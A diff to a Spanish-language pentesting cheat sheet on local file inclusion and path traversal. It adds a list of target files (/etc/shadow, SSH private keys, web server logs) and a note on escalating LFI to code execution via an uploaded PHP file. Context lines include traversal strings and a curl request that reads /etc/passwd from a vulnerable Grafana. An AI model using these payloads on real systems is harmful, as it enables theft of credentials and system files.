@@ -1,3 +1,10 @@
+#### Ficheros interesantes en LFI
+* /etc/passwd
+* /etc/shadow
+* /var/log/apache2/access.log
+* /var/log/httpd/access.log
+* /home/$USER/.ssh/id_rsa
+
 #### Path traversal basics
 ```bash
 ../../etc/passwd
@@ -24,3 +31,6 @@ Con CURL. En alguna versión vulnerable de "Grafana", se puede ver ficheros de l
 ```bash
 curl http://ip/../../../../../../../../etc/passwd --path-as-is -o fichero.extension
 ```
+
+#### LFI to RCE
+Si detectamos un LFI y por casualidad podemos subir ficheros, podriamos subir un fichero malicioso en php
